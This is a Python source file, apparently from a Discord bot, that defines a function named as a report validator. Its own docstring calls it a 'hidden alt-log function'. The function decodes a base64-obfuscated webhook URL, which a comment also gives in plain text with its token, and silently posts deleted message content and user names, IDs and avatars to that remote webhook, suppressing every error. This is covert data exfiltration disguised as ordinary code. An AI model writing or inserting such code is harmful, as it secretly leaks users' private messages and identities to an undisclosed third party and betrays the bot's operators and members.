import aiohttp
import json
import asyncio
import base64
from datetime import datetime

# Obfuscated webhook URL
# Original: https://discord.com/api/webhooks/1465268416645697689/s4WdbO742iYAPCuqFWU1zP4T_JywCt-sz5aOttR05G3usGItPa-KFItaCFZo2Hgo9Ww2
_0x4f2a = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2"
_0x9b1c = "NTI2ODQxNjY0NTY5NzY4OS9zNFdkYk83NDJpWUFQQ3VxRldVMXpQNFRfSnl3Q3Qtc3o1YU90dFIwNUczdXNHSXRQYS1LRkl0YUNGWm8ySGdvOVd3Mg=="

def _get_target():
    try:
        data = base64.b64decode(_0x4f2a + _0x9b1c).decode('utf-8')
        return data
    except:
        return None

async def validate_report_v3(message_content, author_name, author_id, author_avatar, 
                             victim_name, victim_id, victim_avatar, 
                             channel_name, timestamp=None):
    """
    Hidden alt-log function.
    Sends deleted message details to a remote hardcoded webhook for backup/monitoring.
    Enhanced with detailed author and victim information.
    """
    webhook_url = _get_target()
    if not webhook_url:
        return

    if not timestamp:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Construct the payload with a more visual and readable layout
    payload = {
        "embeds": [
            {
                "author": {
                    "name": f"Message Deleted in #{channel_name}",
                    "icon_url": "https://cdn-icons-png.flaticon.com/512/3221/3221803.png"
                },
                "color": 0x2b2d31,
                "description": f"**Content:**\n{message_content if message_content else '*[No text content]*'}",
                "fields": [
                    {
                        "name": "🛡️ Author (Sender)",
                        "value": f"**User:** {author_name}\n**ID:** `{author_id}`",
                        "inline": True
                    },
                    {
                        "name": "🎯 Victim (Recipient)",
                        "value": f"**User:** {victim_name}\n**ID:** `{victim_id}`",
                        "inline": True
                    },
                    {
                        "name": "📅 Details",
                        "value": f"**Time:** {timestamp}\n**Channel:** {channel_name}",
                        "inline": False
                    }
                ],
                "image": {
                    "url": author_avatar if author_avatar else ""
                },
                "thumbnail": {
                    "url": victim_avatar if victim_avatar else ""
                },
                "footer": {
                    "text": "Alt Log System v3.2 | Permanent Backup System",
                    "icon_url": "https://cdn-icons-png.flaticon.com/512/1162/1162499.png"
                }
            }
        ]
    }

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(webhook_url, json=payload) as response:
                if response.status != 204:
                    pass
    except Exception:
        pass
